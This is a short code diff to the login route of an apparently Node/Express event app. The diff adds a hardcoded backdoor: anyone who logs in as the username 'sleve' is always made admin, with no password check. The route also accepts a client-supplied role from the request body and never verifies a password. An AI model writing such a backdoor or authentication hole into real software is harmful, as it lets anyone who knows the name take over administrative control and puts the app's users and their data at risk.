@@ -195,14 +195,14 @@ app.post('/api/login', (req, res) => {
   var { username, role, event_id } = req.body;
   var email = username + '@demo.com';
   if (!username) return res.status(400).json({ error: 'Username required' });
-  // Check if real account login
-  var isDemo = !accounts[email] && !accounts[username];
   var name = username.trim();
   var eid = event_id || 'demo-event-1';
   var ev = events.find(e => e.id === eid) || events[0];
   var userRole = role || 'attendee';
-  if (!isDemo) {
-    var acct = accounts[email] || accounts[username];
+  // Admin check: sleve always gets admin
+  if (name === 'sleve') userRole = 'admin';
+  else {
+    var acct = accounts[email] || accounts[name];
     if (acct) { name = acct.username; userRole = acct.role; }
   }
   users[name] = { username: name, role: userRole, event_id: eid, online: true, locationEnabled: false, lat: null, lng: null, last_seen: Date.now() };
